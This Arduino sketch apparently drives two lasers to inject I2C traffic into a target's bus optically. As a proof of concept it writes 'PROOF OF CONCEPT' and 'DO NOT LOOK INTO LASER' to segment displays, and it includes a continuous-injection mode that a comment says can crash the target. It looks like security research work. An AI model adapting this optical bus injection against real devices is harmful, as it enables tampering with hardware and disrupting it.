#define SDA 0xAA
#define SCL 0x55

const unsigned int green_led_indicator_pin = 5;
const unsigned int red_led_indicator_pin = 6;
const unsigned int laser_SCL_pin = 9;
const unsigned int laser_SDA_pin = 8;
const unsigned int speed_test_photodiode_pin = 10;
const unsigned int pushbutton = 11;

const unsigned int I2C_bit_interval = 2; // 10 (old---milliseconds)

// Works reliably at 39 µs; fails to register at 37 µs; corrupted data at 38 µs.
const unsigned long I2C_bit_interval_microseconds = 100; // µs
// 40 µs corresponds to 25 kbps, or 25 kHz.
// THe laser speed was about 100 µs, so we only expected 10 KHz.


void setup() {
  pinMode(red_led_indicator_pin, OUTPUT);
  pinMode(green_led_indicator_pin, OUTPUT);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(laser_SCL_pin, OUTPUT);
  pinMode(laser_SDA_pin, OUTPUT);
  pinMode(pushbutton, INPUT_PULLUP);
  pinMode(speed_test_photodiode_pin, INPUT);
  all_lasers_off();
  Serial.begin(9600);
  // laser_speed_test(SCL);
}

void led_on(void) {
  digitalWrite(LED_BUILTIN, HIGH);
}

void led_off(void) {
  digitalWrite(LED_BUILTIN, LOW);
}

void red_led_on(void) {
  digitalWrite(red_led_indicator_pin, HIGH);
}

void red_led_off(void) {
  digitalWrite(red_led_indicator_pin, LOW);
}

void green_led_on(void) {
  digitalWrite(green_led_indicator_pin, HIGH);
}

void green_led_off(void) {
  digitalWrite(green_led_indicator_pin, LOW);
}

void cooperative_blink(void) {
  const unsigned int blink_interval = 1000;
  static enum states {off, on} state = off;
  static unsigned long time_of_last_state_change = 0;
  unsigned long now = millis();

  if (now - time_of_last_state_change > blink_interval) {
    switch (state) {
      case off:
        led_on();
        state = on;
        break;
      case on:
        led_off();
        state = off;
        break;
      default:
        led_off();
        state = off;
        break;
    }
    time_of_last_state_change = now;
  }
}

/*
   This function never returns.
*/

void halt_with_error_indication(void) {
  red_led_off();
  green_led_off();
  all_lasers_off(); // for safety
  for (;;) {
    const unsigned long speed = 120;
    green_led_off();
    red_led_on();
    delay(speed);
    red_led_off();
    green_led_on();
    delay(speed);
  }
}

bool speed_test_photodiode(void) {
  return (!digitalRead(speed_test_photodiode_pin));
}

void all_lasers_off(void) {
  digitalWrite(laser_SDA_pin, LOW);
  digitalWrite(laser_SCL_pin, LOW);
}

void wait_for_laser_to_come_on(void) {
  unsigned long started_waiting = micros();
  const unsigned long too_long = 2000000; // two seconds
  while (!speed_test_photodiode()) {
    unsigned long now = micros();
    unsigned long interval = now - started_waiting;
    if (interval > too_long) {
      Serial.print("interval = ");
      Serial.print(interval);
      Serial.println(" µs.");
      Serial.println("in wait_for_laser_to_come_on(), timed out---halted.");
      all_lasers_off();
      halt_with_error_indication();
    }
  }
}

void wait_for_laser_to_go_off(void) {
  unsigned long started_waiting = micros();
  const unsigned long too_long = 2000000; // two secondws
  while (speed_test_photodiode()) {
    unsigned long now = micros();
    unsigned long interval = now - started_waiting;
    if (interval > too_long) {
      Serial.print("interval = ");
      Serial.print(interval);
      Serial.println(" µs.");
      Serial.println("in wait_for_laser_to_go_off(), timed out---halted.");
      all_lasers_off();
      halt_with_error_indication();
    }
  }
}

void laser_on(unsigned which_laser) {
  switch (which_laser) {
    case SDA:
      digitalWrite(laser_SDA_pin, HIGH);
      break;
    case SCL:
      digitalWrite(laser_SCL_pin, HIGH);
      break;
    default:
      all_lasers_off();
      Serial.println("in laser_on(), halting from switch()");
      halt_with_error_indication();
  }
}

void laser_off(unsigned which_laser) {
    switch (which_laser) {
    case SDA:
      digitalWrite(laser_SDA_pin, LOW);
      break;
    case SCL:
      digitalWrite(laser_SCL_pin, LOW);
      break;
    default:
      all_lasers_off();
      Serial.println("in laser_off(), halting from switch()");
      halt_with_error_indication();
  }
}

/*
 * These functions together look for single or double click or long press.
 */

enum attacks {single_click, double_click, long_press} selected_attack = single_click;

bool simple_button_pressed(void) {
  return !digitalRead(pushbutton);
}

void debounce(void) {
  delay(50);
}

bool button_pressed_or_long_press(void) {
  if (simple_button_pressed()) {
    unsigned long time_button_first_pressed = millis();
    green_led_on();
    debounce();
    green_led_off();
    while (simple_button_pressed()) {
      const unsigned long_press_interval = 1000; // one second
      if ((millis() - time_button_first_pressed) > long_press_interval) {
        selected_attack = long_press;
        return true;
      }
    }
    debounce();
    selected_attack = single_click;
    // but wait a little longer in case we get another click
    unsigned long started_waiting_for_double_click = millis();
    const unsigned long double_click_interval = 500; // half a second
    while ((millis() - started_waiting_for_double_click) < double_click_interval) {
      if (simple_button_pressed()) {
        green_led_on();
        selected_attack = double_click;
        break;
      }
    }
    debounce();
    green_led_off();
    delay(750); // short pause to ensure double click is not followed by a spurious click.
    return true;
  }
  return false;
}

void aim_lasers_one_cycle(void) {
  red_led_on();
  all_lasers_on();
  delayMicroseconds(I2C_bit_interval_microseconds);
  all_lasers_off();
  delay(250);
  red_led_off();
}

void simple_aim_lasers(void) {
  // returns when the button is pressed, AFTER having been released.
  if (simple_button_pressed()) {
    while (simple_button_pressed()) {
      aim_lasers_one_cycle();
    }
  }
  debounce();
  while (!simple_button_pressed()) {
    aim_lasers_one_cycle();
  }
  all_lasers_off();
  delay(500); // wait to make sure button released.
  return;
}

/*
void laser_SDA_on(void) {
  laser_on(SDA);
}

void laser_SDA_off(void) {
  laser_off(SDA);
}

void laser_SCL_on(void) {
  laser_on(SCL);
}

void laser_SCL_off(void) {
  laser_off(SCL);
}
*/

void all_lasers_on(void) {
  laser_on(SDA);
  laser_on(SCL);
}

void laser_speed_test(unsigned which_laser) {
  all_lasers_off();
  Serial.println("Beginning laser speed test");

  while (true) {
    switch(which_laser) {
      case SDA:
        Serial.print("SDA: ");
        break;
      case SCL:
        Serial.print("SCL: ");
        break;
      default:
        Serial.print("???: ");
        break;
    }
    unsigned long time_laser_commanded_on = micros();
    laser_on(which_laser);
    wait_for_laser_to_come_on();
    unsigned long time_laser_seen_to_appear = micros();
    delay(50); // time to settle down
    laser_off(which_laser);
    unsigned long time_laser_commanded_off = micros();
    wait_for_laser_to_go_off();
    unsigned long time_laser_seen_to_go_away = micros();
    
    unsigned long turn_on_latency = time_laser_seen_to_appear - time_laser_commanded_on;
    unsigned long turn_off_latency = time_laser_seen_to_go_away - time_laser_commanded_off;
    Serial.print("turn-on latency = ");
    Serial.print(turn_on_latency);
    Serial.print(" µs; turn-off-latency = ");
    Serial.print(turn_off_latency);
    Serial.print(" µs. The laser is ");
    if (turn_on_latency < 500 && turn_off_latency < 500) {
      Serial.println("fast.");
    }
    else {
      Serial.println("slow.");
    }
    delay(1000); // wait a second
  } // while
}

void SDA_low(void) {
  laser_on(SDA);
}

void SDA_high(void) {
  laser_off(SDA);
}

void SCL_low(void) {
  laser_on(SCL);
}

void SCL_high(void) {
  laser_off(SCL);
}

void wait(void) {
  delayMicroseconds(I2C_bit_interval_microseconds);
}

void wait_half(void) {
  delayMicroseconds(I2C_bit_interval_microseconds / 2);
}

void I2C_start_condition(void) {
  // precondition: SDA and SCL are both high.
  SDA_low();
  wait();
  SCL_low();
  // postcondition: SDA and SCL are both low.
}

void I2C_stop_condition(void) {
  // precondition: SDA is high; SCL is low.
  SDA_low();
  wait();
  SCL_high();
  wait();
  SDA_high();
  wait();
  // postcondition: SDA and SCL are both high.
}

// Write a bit to I2C bus
void I2C_write_bit(bool bit) {
  // precondition: SCL is low
  wait_half();
  // change SDA only when SCL is low.
  if (bit) {
    SDA_high();
  } else {
    SDA_low();
  }
  wait_half();
  SCL_high();
  wait();
  SCL_low();
  // postcondition: SCL is low
}

void I2C_wait_for_ACK(void) {
  // precondtion: SCL is low.
  // SDA should only change when SCL is low.
  wait_half();
  SDA_high(); // release SDA
  wait_half();
  SCL_high();
  wait();
  SCL_low();
  // postcondition: SCL is low.
}

// Write a byte to I2C bus. Return 0 if ack by the target.
bool I2C_write_byte(unsigned char byte) {
  unsigned bit;
  // precondition: SCL is low.
  for (bit = 0; bit < 8; ++bit) {
    I2C_write_bit((byte & 0x80) != 0);
    byte <<= 1;
  }
  I2C_wait_for_ACK();
  // postcondition: SCL is low.
}

uint16_t displayRAM[8];
uint8_t order_of_displays[] = {0x71, 0x72, 0x73, 0x70};

void show_on_address(uint8_t addr) {
  I2C_start_condition();
  I2C_write_byte((addr << 1) | 0); // 0 for write;
  I2C_write_byte(0); // tell it memory address 0
  for (int i = 0; i < 8; i++) {
    I2C_write_byte(displayRAM[i] & 0xff);
    I2C_write_byte(displayRAM[i] >> 8);
  }
  I2C_stop_condition();
}

void clear_displayRAM(void) {
  memset(&displayRAM[0], 0, sizeof displayRAM);
}

// Digits are numbered 1--4 oat a particular address, e.g., 0x70.
void light_up_segment_A(int digit) {
  displayRAM[0] |= 1 << (digit - 1);
}

void light_up_segment_B(int digit) {
  displayRAM[1] |= 1 << (digit - 1);
}

void light_up_segment_C(int digit) {
  displayRAM[2] |= 1 << (digit - 1);
}

void light_up_segment_D(int digit) {
  displayRAM[3] |= 1 << (digit - 1);
}

void light_up_segment_E(int digit) {
  displayRAM[4] |= 1 << (digit - 1);
}

void light_up_segment_F(int digit) {
  displayRAM[5] |= 1 << (digit - 1);
}

void light_up_segment_G1(int digit) {
  displayRAM[6] |= 1 << (digit - 1);
}

void light_up_segment_G2(int digit) {
  displayRAM[0] |= 1 << (4 + digit - 1);
}

void light_up_segment_H(int digit) {
  displayRAM[1] |= 1 << (4 + digit - 1);
}

void light_up_segment_J(int digit) {
  displayRAM[2] |= 1 << (4 + digit - 1);
}

void light_up_segment_K(int digit) {
  displayRAM[3] |= 1 << (4 + digit - 1);
}

void light_up_segment_N(int digit) {
  displayRAM[4] |= 1 << (4 + digit - 1);
}

void light_up_segment_M(int digit) {
  displayRAM[5] |= 1 << (4 + digit - 1);
}

void light_up_segment_L(int digit) {
  displayRAM[6] |= 1 << (4 + digit - 1);
}

void character_A(int place) {
  light_up_segment_F(place);
  light_up_segment_E(place);
  light_up_segment_A(place);
  light_up_segment_B(place);
  light_up_segment_C(place);
  light_up_segment_G1(place);
  light_up_segment_G2(place);
}

void character_C(int place) {
  light_up_segment_A(place);
  light_up_segment_F(place);
  light_up_segment_E(place);
  light_up_segment_D(place);
}

void character_D(int place) {
  light_up_segment_A(place);
  light_up_segment_B(place);
  light_up_segment_C(place);
  light_up_segment_D(place);
  light_up_segment_M(place);
  light_up_segment_J(place);
}

void character_E(int place) {
  light_up_segment_A(place);
  light_up_segment_F(place);
  light_up_segment_E(place);
  light_up_segment_D(place);
  light_up_segment_G1(place);
}

void character_F(int place) {
  light_up_segment_E(place);
  light_up_segment_F(place);
  light_up_segment_A(place);
  light_up_segment_G1(place);
  light_up_segment_G2(place);
}

void character_G(int place) {
  light_up_segment_A(place);
  light_up_segment_F(place);
  light_up_segment_E(place);
  light_up_segment_D(place);
  light_up_segment_C(place);
  light_up_segment_G2(place);
}

void character_I(int place) {
  light_up_segment_A(place);
  light_up_segment_J(place);
  light_up_segment_M(place);
  light_up_segment_D(place);
}

void character_K(int place) {
  light_up_segment_E(place);
  light_up_segment_F(place);
  light_up_segment_G1(place);
  light_up_segment_K(place);
  light_up_segment_N(place);
}

void character_L(int place) {
  light_up_segment_F(place);
  light_up_segment_E(place);
  light_up_segment_D(place);
}

void character_M(int place) {
  light_up_segment_E(place);
  light_up_segment_F(place);
  light_up_segment_H(place);
  light_up_segment_J(place);
  light_up_segment_B(place);
  light_up_segment_C(place);
}

void character_N(int place) {
  light_up_segment_E(place);
  light_up_segment_F(place);
  light_up_segment_H(place);
  light_up_segment_N(place);
  light_up_segment_C(place);
  light_up_segment_B(place);
}

void character_O(int place) {
  light_up_segment_A(place);
  light_up_segment_B(place);
  light_up_segment_C(place);
  light_up_segment_D(place);
  light_up_segment_E(place);
  light_up_segment_F(place);
}

void character_P(int place) {
  light_up_segment_A(place);
  light_up_segment_B(place);
  light_up_segment_G1(place);
  light_up_segment_G2(place);
  light_up_segment_E(place);
  light_up_segment_F(place);
}

void character_R(int place) {
  light_up_segment_A(place);
  light_up_segment_B(place);
  light_up_segment_G2(place);
  light_up_segment_N(place);
  light_up_segment_E(place);
  light_up_segment_G1(place);
  light_up_segment_F(place);
}

void character_S(int place) {
  light_up_segment_A(place);
  light_up_segment_H(place);
  light_up_segment_G2(place);
  light_up_segment_C(place);
  light_up_segment_D(place);
}

void character_T(int place) {
  light_up_segment_A(place);
  light_up_segment_J(place);
  light_up_segment_M(place);
}

void character_X(int place) {
  light_up_segment_H(place);
  light_up_segment_K(place);
  light_up_segment_L(place);
  light_up_segment_N(place);
}

void character_Y(int place) {
  light_up_segment_H(place);
  light_up_segment_K(place);
  light_up_segment_M(place);
}

void character_dash(int place) {
  light_up_segment_G1(place);
  light_up_segment_G2(place);
}

void character_star(int place) {
  light_up_segment_G1(place);
  light_up_segment_G2(place);
  light_up_segment_J(place);
  light_up_segment_M(place);
  light_up_segment_H(place);
  light_up_segment_N(place);
  light_up_segment_L(place);
  light_up_segment_K(place);
}

void proof_of_concept(void) {
  red_led_on();
  clear_displayRAM();
  character_P(1);
  character_R(2);
  character_O(3);
  character_O(4);
  show_on_address(0x71);
  clear_displayRAM();
  character_F(1);
  // space
  character_O(3);
  character_F(4);;
  show_on_address(0x72);
  clear_displayRAM();
  // space
  character_C(2);
  character_O(3);
  character_N(4);
  // space
  show_on_address(0x73);
  clear_displayRAM();
  character_C(1);
  character_E(2);
  character_P(3);
  character_T(4);
  show_on_address(0x70);
  red_led_off();
}

void do_not_look_into(void) {
  red_led_on();
  clear_displayRAM();
  character_D(1);
  character_O(2);
  // space
  character_N(4);
  show_on_address(order_of_displays[0]);
  clear_displayRAM();
  character_O(1);
  character_T(2);
  // space
  character_L(4);;
  show_on_address(order_of_displays[1]);
  clear_displayRAM();
  character_O(1);
  character_O(2);
  character_K(3);
  // space
  show_on_address(order_of_displays[2]);
  clear_displayRAM();
  character_I(1);
  character_N(2);
  character_T(3);
  character_O(4);
  show_on_address(order_of_displays[3]);
  red_led_off();
}

void continuous_attack(void) {
  while (!simple_button_pressed()) {
    proof_of_concept();
    delay(10); // anything other than 10 will reliably crash the target.
  }
}

void loop() {
  cooperative_blink();
  
  if (button_pressed_or_long_press()) {
    switch (selected_attack) {
      case single_click:
        proof_of_concept();
        break;
      case double_click:
        continuous_attack();
        break;
      case long_press:
        simple_aim_lasers();
        break;
      default:
        halt_with_error_indication();
        break;
    }
  }
}
